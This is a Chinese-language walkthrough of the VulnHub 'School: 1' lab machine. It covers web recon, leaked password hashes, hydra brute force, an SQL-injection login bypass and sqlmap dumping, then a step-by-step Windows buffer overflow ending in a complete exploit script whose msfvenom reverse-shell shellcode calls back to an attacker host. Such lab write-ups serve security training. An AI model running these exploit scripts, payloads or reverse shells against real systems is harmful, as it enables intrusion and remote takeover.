靶机地址：[School: 1 ~ VulnHub](https://www.vulnhub.com/entry/school-1,613/)
推荐：VirtualBox

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- "192.168.1.57"
sudo nmap -p "22,23,80" -sV "192.168.1.57"
# 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# 23/tcp open  telnet?
# 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

先访问下23端口看看
```Shell
ncat 192.168.1.57 23
# 返回信息中有验证码 hex编码如下
# ef bf bd 1e 40 ef bf bd 1c
```

访问web服务，跳转到了 `/student_attendance/login.php` ，是一个登录页面
简单试了下弱口令，没什么发现，进行web路径扫描
```Shell
sudo dirsearch -u "http://192.168.1.57"
# /student_attendance/
sudo dirsearch -u "http://192.168.1.57/student_attendance/"
# /student_attendance/database/
```
发现数据库备份 `/student_attendance/database/student_attendance_db.sql`
包含如下内容
```SQL
INSERT INTO `users` (`id`, `name`, `username`, `password`, `type`, `faculty_id`) VALUES
(1, 'Administrator', 'admin', '0192023a7bbd73250516f069df18b500', 1, 0),
(2, 'John Smith', 'jsmith@sample.com', 'af606ddc433ae6471f104872585cf880', 3, 1);
```
Google一下，可以查到 `0192023a7bbd73250516f069df18b500` 是 `admin123` 的MD5 hash
这里暴力破解也可以
```Shell
hydra -l admin -P /home/kali/Tools/Custom/MidPwds.txt -f "192.168.1.57" http-post-form "/student_attendance/ajax.php?action=login:username=^USER^&password=^PASS^:F=\r\n\r\n3"
# [80][http-post-form] host: 192.168.1.57   login: admin   password: admin123
```
SQL注入，使用万能密码也能登录
```
' or 1=1-- -
```
尝试登录，登录成功，进去后有很多CURD功能
尝试对增加功能SQL注入，先试试增加课程
```Shell
sqlmap -r req.txt -p "course,description"
# POST parameter 'MULTIPART course' is vulnerable.
sqlmap -r req.txt -p "course" --dbs
# student_attendance_db
sqlmap -r req.txt -p "course" -D "student_attendance_db" --tables
# system_settings users
sqlmap -r req.txt -p "course" -D "student_attendance_db" -T "users" --columns
sqlmap -r req.txt -p "course" -D "student_attendance_db" -T "users" -C "username,password" --dump
# admin             | 0192023a7bbd73250516f069df18b500 (admin123)
# jsmith@sample.com | af606ddc433ae6471f104872585cf880
# 之前已经得到过了没什么利用价值
sqlmap -r req.txt -p "course" -D "student_attendance_db" -T "system_settings" --columns
sqlmap -r req.txt -p "course" -D "student_attendance_db" -T "system_settings" --dump
# cover_img
# 1604743980_shell.php
```
`/student_attendance/assets/uploads/` 下没有找到这个文件
查看网页源码，发现如下注释
```html
<!-- <a href="index.php?page=site_settings" class="nav-item nav-site_settings"><span class='icon-field'><i class="fa fa-cogs text-danger"></i></span> System Settings</a> -->
```
访问 `/student_attendance/index.php?page=site_settings` ，发现此处的字段和刚才数据库里看到的一致，并且可以进行文件上传，上传一个反弹shell的脚本
上传成功后直接获取到了反弹shell，是 `www-data` 用户的，下面进行信息收集，尝试提权
```Shell
cat /etc/passwd | grep /bin/bash
# root:x:0:0:root:/root:/bin/bash
# ppp:x:1000:1000:ppp,,,:/home/ppp:/bin/bash
find / -user ppp -type f 2>/dev/null
```
常规的方法都尝试了一遍，没什么收获，最终发现这样一个文件
```Shell
cat /root/win
```
内容如下
```Shell
while true
 do
  wine /opt/access/access.exe
  sleep 3
 done
```
进一步查看
```Shell
ls /root/.wine/dosdevices/c:/
# 'Program Files'   ProgramData   users   windows
ls /opt/access/
# access.exe  funcs_access.dll
```
将这两个文件拷贝到windows机器上，看看是否有什么漏洞
```PowerShell
.\access.exe
netstat -ano
# TCP    0.0.0.0:23             0.0.0.0:0              LISTENING       1656
```
进程ID是1656，从任务管理器中查看也可以，可以直接附加
这里选择关闭进程，从Immunity Debugger中打开
`File -> Open` 选择可执行程序，点按两次运行（播放）键，运行程序

==复现崩溃==
编写利用脚本 `collapse.py`
```Python
#!/usr/bin/python
import socket
import sys

filler = b"A" * 2000

payload = filler

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.40.212", 23))
    s.send(payload)
    s.close()
    print("\nDone!")

except:
    print("Wrong!")
    sys.exit()
```

==定位EIP，确定偏移量==
使用msf默认生成的串失败了，自定义一下
`2000 = 20 * 100 = 20 * 25 * 4 = 4 * 5 * 5 * 5 * 4`
使用 4 5 5 5 的序列生成正好因为一个序列的长度正好是4，乘起来正好2000
`locate.py`
```Python
#!/usr/bin/python
import socket
import sys

# msf-pattern_create -l 2000 -s ABCD,efghi,VWXYZ,12345
filler = b"AeV1AeV2AeV3AeV4AeV5AeW1AeW2AeW3AeW4AeW5AeX1AeX2AeX3AeX4AeX5AeY1AeY2AeY3AeY4AeY5AeZ1AeZ2AeZ3AeZ4AeZ5AfV1AfV2AfV3AfV4AfV5AfW1AfW2AfW3AfW4AfW5AfX1AfX2AfX3AfX4AfX5AfY1AfY2AfY3AfY4AfY5AfZ1AfZ2AfZ3AfZ4AfZ5AgV1AgV2AgV3AgV4AgV5AgW1AgW2AgW3AgW4AgW5AgX1AgX2AgX3AgX4AgX5AgY1AgY2AgY3AgY4AgY5AgZ1AgZ2AgZ3AgZ4AgZ5AhV1AhV2AhV3AhV4AhV5AhW1AhW2AhW3AhW4AhW5AhX1AhX2AhX3AhX4AhX5AhY1AhY2AhY3AhY4AhY5AhZ1AhZ2AhZ3AhZ4AhZ5AiV1AiV2AiV3AiV4AiV5AiW1AiW2AiW3AiW4AiW5AiX1AiX2AiX3AiX4AiX5AiY1AiY2AiY3AiY4AiY5AiZ1AiZ2AiZ3AiZ4AiZ5BeV1BeV2BeV3BeV4BeV5BeW1BeW2BeW3BeW4BeW5BeX1BeX2BeX3BeX4BeX5BeY1BeY2BeY3BeY4BeY5BeZ1BeZ2BeZ3BeZ4BeZ5BfV1BfV2BfV3BfV4BfV5BfW1BfW2BfW3BfW4BfW5BfX1BfX2BfX3BfX4BfX5BfY1BfY2BfY3BfY4BfY5BfZ1BfZ2BfZ3BfZ4BfZ5BgV1BgV2BgV3BgV4BgV5BgW1BgW2BgW3BgW4BgW5BgX1BgX2BgX3BgX4BgX5BgY1BgY2BgY3BgY4BgY5BgZ1BgZ2BgZ3BgZ4BgZ5BhV1BhV2BhV3BhV4BhV5BhW1BhW2BhW3BhW4BhW5BhX1BhX2BhX3BhX4BhX5BhY1BhY2BhY3BhY4BhY5BhZ1BhZ2BhZ3BhZ4BhZ5BiV1BiV2BiV3BiV4BiV5BiW1BiW2BiW3BiW4BiW5BiX1BiX2BiX3BiX4BiX5BiY1BiY2BiY3BiY4BiY5BiZ1BiZ2BiZ3BiZ4BiZ5CeV1CeV2CeV3CeV4CeV5CeW1CeW2CeW3CeW4CeW5CeX1CeX2CeX3CeX4CeX5CeY1CeY2CeY3CeY4CeY5CeZ1CeZ2CeZ3CeZ4CeZ5CfV1CfV2CfV3CfV4CfV5CfW1CfW2CfW3CfW4CfW5CfX1CfX2CfX3CfX4CfX5CfY1CfY2CfY3CfY4CfY5CfZ1CfZ2CfZ3CfZ4CfZ5CgV1CgV2CgV3CgV4CgV5CgW1CgW2CgW3CgW4CgW5CgX1CgX2CgX3CgX4CgX5CgY1CgY2CgY3CgY4CgY5CgZ1CgZ2CgZ3CgZ4CgZ5ChV1ChV2ChV3ChV4ChV5ChW1ChW2ChW3ChW4ChW5ChX1ChX2ChX3ChX4ChX5ChY1ChY2ChY3ChY4ChY5ChZ1ChZ2ChZ3ChZ4ChZ5CiV1CiV2CiV3CiV4CiV5CiW1CiW2CiW3CiW4CiW5CiX1CiX2CiX3CiX4CiX5CiY1CiY2CiY3CiY4CiY5CiZ1CiZ2CiZ3CiZ4CiZ5DeV1DeV2DeV3DeV4DeV5DeW1DeW2DeW3DeW4DeW5DeX1DeX2DeX3DeX4DeX5DeY1DeY2DeY3DeY4DeY5DeZ1DeZ2DeZ3DeZ4DeZ5DfV1DfV2DfV3DfV4DfV5DfW1DfW2DfW3DfW4DfW5DfX1DfX2DfX3DfX4DfX5DfY1DfY2DfY3DfY4DfY5DfZ1DfZ2DfZ3DfZ4DfZ5DgV1DgV2DgV3DgV4DgV5DgW1DgW2DgW3DgW4DgW5DgX1DgX2DgX3DgX4DgX5DgY1DgY2DgY3DgY4DgY5DgZ1DgZ2DgZ3DgZ4DgZ5DhV1DhV2DhV3DhV4DhV5DhW1DhW2DhW3DhW4DhW5DhX1DhX2DhX3DhX4DhX5DhY1DhY2DhY3DhY4DhY5DhZ1DhZ2DhZ3DhZ4DhZ5DiV1DiV2DiV3DiV4DiV5DiW1DiW2DiW3DiW4DiW5DiX1DiX2DiX3DiX4DiX5DiY1DiY2DiY3DiY4DiY5DiZ1DiZ2DiZ3DiZ4DiZ5"

payload = filler

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.40.212", 23))
    s.send(payload)
    s.close()
    print("\nDone!")

except:
    print("Wrong!")
    sys.exit()
```
windows上重启程序，运行脚本，崩溃时EIP内容为 `69443156`
```Shell
msf-pattern_offset -l 2000 -s ABCD,efghi,VWXYZ,12345 -q 69443156
# [*] Exact match at offset 1902
```
偏移量成功确定了，是1902

==为shellcode寻找空间==
程序崩溃时ESP正好指向我们的缓冲区，需要确定空间是否足够大可以用来存放shellcode
定位下ESP偏移量
```Shell
msf-pattern_offset -l 2000 -s ABCD,efghi,VWXYZ,12345 -q V2Di
# [*] Exact match at offset 1906
```
1906，正好在EIP后面，编写代码看看后面的空间够不够用
`seek.py`
```Python
#!/usr/bin/python
import socket
import sys

filler = b"A" * 1902
eip = b"B" * 4
code = b"C" * 500

payload = filler + eip + code

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.40.212", 23))
    s.send(payload)
    s.close()
    print("\nDone!")

except:
    print("Wrong!")
    sys.exit()
```
C落在区间 `[ 00E9FB48 , 00E9FD3C )` ，计算区间长度
```Shell
s=$((0x00E9FB48));e=$((0x00E9FD3C));echo $[$e-$s]
# 500
```
长度足够，ESP可以用来存放shellcode

==检查坏字符==
`bad_chars.py`
```Python
#!/usr/bin/python
import socket
import sys

filler = b"A" * 1902
eip = b"B" * 4

# /x00
badchars = b""
badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

payload = filler + eip + badchars

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.40.212", 23))
    # print(s.recv(1024).decode())
    s.send(payload)
    s.close()
    print("\nDone!")

except:
    print("Wrong!")
    sys.exit()
```
每次崩溃，右键ESP，选择 `Follow in Dump` ，检查从哪个字符开始没出现
经过测试，坏字符依次是：`0x4d` 、`0x4f` 、`0x5f` 、`0x79` 、`0x7e` 、`0x7f` ，不要忘了 `0x00`
最终代码如下
```Python
#!/usr/bin/python
import socket
import sys

filler = b"A" * 1902
eip = b"B" * 4

# \x00\x4d\x4f\x5f\x79\x7e\x7f
badchars = b""
badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4e\x50"
badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x60"
badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x7a\x7b\x7c\x7d\x80"
badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

payload = filler + eip + badchars

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.40.212", 23))
    # print(s.recv(1024).decode())
    s.send(payload)
    s.close()
    print("\nDone!")

except:
    print("Wrong!")
    sys.exit()
```

==确定返回指令的地址==
使用 `!mona modules` 命令查看调用了哪些模块，关注所有安全选项都是false的
很明显，应该利用刚才拷贝的 `funcs_access.dll`
在搜索前 使用Metasploit的NASM Shell脚本找到JMP ESP对应的操作码
```Shell
msf-nasm_shell
nasm > jmp esp
# 00000000  FFE4              jmp esp
```
调用 `mona.py` 搜索这个操作码 `!mona find -s "\xff\xe4" -m "funcs_access.dll"`
找到了两个，分别是
```
0x625012d0
0x625012dd
```
都不包含坏字符，随便用一个就可以
试一下，点击上方黑色图标，一个向右的箭头指向竖着的四个点，输入 `0x625012d0` ，可以看到确实指向 `JMP ESP` 指令
写入代码中要反过来，别忘了
```Python
eip = b"\xd0\x12\x50\x62"
```

==生成shellcode==
```Shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.40.129 LPORT=4444 -f py –e x86/shikata_ga_nai -b "\x00\x4d\x4f\x5f\x79\x7e\x7f" EXITFUNC=thread
```
验证代码 `poc.py` ，别忘了加几个nop操作符
```Python
#!/usr/bin/python
import socket
import sys

filler = b"A" * 1902
eip = b"\xd0\x12\x50\x62"
nops = b"\x90" * 10

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.40.129 LPORT=4444 -f py –e x86/shikata_ga_nai -b "\x00\x4d\x4f\x5f\x79\x7e\x7f" EXITFUNC=thread
buf =  b""
buf += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x46\xfc\x7a\xcf\x83\xee\xfc\xe2\xf4\xba\x14"
buf += b"\xf8\xcf\x46\xfc\x1a\x46\xa3\xcd\xba\xab\xcd\xac\x4a"
buf += b"\x44\x14\xf0\xf1\x9d\x52\x77\x08\xe7\x49\x4b\x30\xe9"
buf += b"\x77\x03\xd6\xf3\x27\x80\x78\xe3\x66\x3d\xb5\xc2\x47"
buf += b"\x3b\x98\x3d\x14\xab\xf1\x9d\x56\x77\x30\xf3\xcd\xb0"
buf += b"\x6b\xb7\xa5\xb4\x7b\x1e\x17\x77\x23\xef\x47\x2f\xf1"
buf += b"\x86\x5e\x1f\x40\x86\xcd\xc8\xf1\xce\x90\xcd\x85\x63"
buf += b"\x87\x33\x77\xce\x81\xc4\x9a\xba\xb0\xff\x07\x37\x7d"
buf += b"\x81\x5e\xba\xa2\xa4\xf1\x97\x62\xfd\xa9\xa9\xcd\xf0"
buf += b"\x31\x44\x1e\xe0\x7b\x1c\xcd\xf8\xf1\xce\x96\x75\x3e"
buf += b"\xeb\x62\xa7\x21\xae\x1f\xa6\x2b\x30\xa6\xa3\x25\x95"
buf += b"\xcd\xee\x91\x42\x1b\x94\x49\xfd\x46\xfc\x12\xb8\x35"
buf += b"\xce\x25\x9b\x2e\xb0\x0d\xe9\x41\x03\xaf\x77\xd6\xfd"
buf += b"\x7a\xcf\x6f\x38\x2e\x9f\x2e\xd5\xfa\xa4\x46\x03\xaf"
buf += b"\x9f\x16\xac\x2a\x8f\x16\xbc\x2a\xa7\xac\xf3\xa5\x2f"
buf += b"\xb9\x29\xed\xa5\x43\x94\xba\x67\x6e\x7d\x12\xcd\x46"
buf += b"\xed\x26\x46\xa0\x96\x6a\x99\x11\x94\xe3\x6a\x32\x9d"
buf += b"\x85\x1a\xc3\x3c\x0e\xc3\xb9\xb2\x72\xba\xaa\x94\x8a"
buf += b"\x7a\xe4\xaa\x85\x1a\x2e\x9f\x17\xab\x46\x75\x99\x98"
buf += b"\x11\xab\x4b\x39\x2c\xee\x23\x99\xa4\x01\x1c\x08\x02"
buf += b"\xd8\x46\xce\x47\x71\x3e\xeb\x56\x3a\x7a\x8b\x12\xac"
buf += b"\x2c\x99\x10\xba\x2c\x81\x10\xaa\x29\x99\x2e\x85\xb6"
buf += b"\xf0\xc0\x03\xaf\x46\xa6\xb2\x2c\x89\xb9\xcc\x12\xc7"
buf += b"\xc1\xe1\x1a\x30\x93\x47\x9a\xd2\x6c\xf6\x12\x69\xd3"
buf += b"\x41\xe7\x30\x93\xc0\x7c\xb3\x4c\x7c\x81\x2f\x33\xf9"
buf += b"\xc1\x88\x55\x8e\x15\xa5\x46\xaf\x85\x1a"

payload = filler + eip + nops + buf

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.40.212", 23))
    # print(s.recv(1024).decode())
    s.send(payload)
    s.close()
    print("\nDone!")
except:
    print("Wrong!")
    sys.exit()
```
开启监听，执行脚本，成功获取到反弹shell

针对对目标机器的利用代码 `exp.py`
```Python
import socket
import sys

filler = b"A" * 1902
eip = b"\xd0\x12\x50\x62"
nops = b"\x90" * 10

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.26 LPORT=4444 -f py –e x86/shikata_ga_nai -b "\x00\x4d\x4f\x5f\x79\x7e\x7f" EXITFUNC=thread
buf =  b""
buf += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x63\xe6\x64\xfe\x83\xee\xfc\xe2\xf4\x9f\x0e"
buf += b"\xe6\xfe\x63\xe6\x04\x77\x86\xd7\xa4\x9a\xe8\xb6\x54"
buf += b"\x75\x31\xea\xef\xac\x77\x6d\x16\xd6\x6c\x51\x2e\xd8"
buf += b"\x52\x19\xc8\xc2\x02\x9a\x66\xd2\x43\x27\xab\xf3\x62"
buf += b"\x21\x86\x0c\x31\xb1\xef\xac\x73\x6d\x2e\xc2\xe8\xaa"
buf += b"\x75\x86\x80\xae\x65\x2f\x32\x6d\x3d\xde\x62\x35\xef"
buf += b"\xb7\x7b\x05\x5e\xb7\xe8\xd2\xef\xff\xb5\xd7\x9b\x52"
buf += b"\xa2\x29\x69\xff\xa4\xde\x84\x8b\x95\xe5\x19\x06\x58"
buf += b"\x9b\x40\x8b\x87\xbe\xef\xa6\x47\xe7\xb7\x98\xe8\xea"
buf += b"\x2f\x75\x3b\xfa\x65\x2d\xe8\xe2\xef\xff\xb3\x6f\x20"
buf += b"\xda\x47\xbd\x3f\x9f\x3a\xbc\x35\x01\x83\xb9\x3b\xa4"
buf += b"\xe8\xf4\x8f\x73\x3e\x8e\x57\xcc\x63\xe6\x0c\x89\x10"
buf += b"\xd4\x3b\xaa\x0b\xaa\x13\xd8\x64\x19\xb1\x46\xf3\xe7"
buf += b"\x64\xfe\x4a\x22\x30\xae\x0b\xcf\xe4\x95\x63\x19\xb1"
buf += b"\xae\x33\xb6\x34\xbe\x33\xa6\x34\x96\x89\xe9\xbb\x1e"
buf += b"\x9c\x33\xf3\x94\x66\x8e\xa4\x56\x62\xfc\x0c\xfc\x63"
buf += b"\xf7\x38\x77\x85\x8c\x74\xa8\x34\x8e\xfd\x5b\x17\x87"
buf += b"\x9b\x2b\xe6\x26\x10\xf2\x9c\xa8\x6c\x8b\x8f\x8e\x94"
buf += b"\x4b\xc1\xb0\x9b\x2b\x0b\x85\x09\x9a\x63\x6f\x87\xa9"
buf += b"\x34\xb1\x55\x08\x09\xf4\x3d\xa8\x81\x1b\x02\x39\x27"
buf += b"\xc2\x58\xff\x62\x6b\x20\xda\x73\x20\x64\xba\x37\xb6"
buf += b"\x32\xa8\x35\xa0\x32\xb0\x35\xb0\x37\xa8\x0b\x9f\xa8"
buf += b"\xc1\xe5\x19\xb1\x77\x83\xa8\x32\xb8\x9c\xd6\x0c\xf6"
buf += b"\xe4\xfb\x04\x01\xb6\x5d\x84\xe3\x49\xec\x0c\x58\xf6"
buf += b"\x5b\xf9\x01\xb6\xda\x62\x82\x69\x66\x9f\x1e\x16\xe3"
buf += b"\xdf\xb9\x70\x94\x0b\x94\x63\xb5\x9b\x2b"

payload = filler + eip + nops + buf

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.57", 23))
    # print(s.recv(1024).decode())
    s.send(payload)
    s.close()
    print("\nDone!")
except:
    print("Wrong!")
    sys.exit()
```

成功获取到反弹shell
```PowerShell
dir
cd root
type proof.txt
echo %username%
# root
```

再试试用x64dbg调试看看，直接右键exe文件，用x64dbg调试
猛点运行，按 `F9` 也行 ，直到不再进一步执行。……TODO 更快的方式跳过？
前面定位偏移量、检查坏字符没有什么不同
崩溃时可以重新运行程序 `Ctrl + F2` ，而不必退出重开，这点还不错
确定返回地址：右键搜索 命令 `JMP ESP` 。……TODO 查看库是否开了安全选项？
